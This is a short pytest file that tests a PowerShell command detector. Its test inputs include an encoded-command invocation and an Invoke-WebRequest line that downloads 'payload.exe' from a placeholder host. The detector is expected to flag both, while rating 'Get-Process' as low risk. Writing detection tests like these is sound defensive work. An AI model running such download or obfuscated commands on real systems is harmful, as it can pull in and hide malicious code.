from analyzer.powershell_detector import PowerShellDetector


def test_encoded_powershell_detection():

    detector = PowerShellDetector()

    result = detector.analyze(
        "powershell.exe -EncodedCommand SGVsbG8="
    )

    assert result["is_suspicious"] is True
    assert result["risk"] in {"MEDIUM", "HIGH", "CRITICAL"}
    assert result["matched_patterns"]


def test_normal_powershell_command():

    detector = PowerShellDetector()

    result = detector.analyze(
        "Get-Process"
    )

    assert result["is_suspicious"] is False
    assert result["risk"] == "LOW"


def test_download_string_detection():

    detector = PowerShellDetector()

    result = detector.analyze(
        "powershell Invoke-WebRequest https://example.com/payload.exe"
    )

    assert result["is_suspicious"] is True
    assert result["risk"] in {"MEDIUM", "HIGH", "CRITICAL"}


def test_invalid_command_type():

    detector = PowerShellDetector()

    try:
        detector.analyze(None)
        assert False
    except TypeError:
        assert True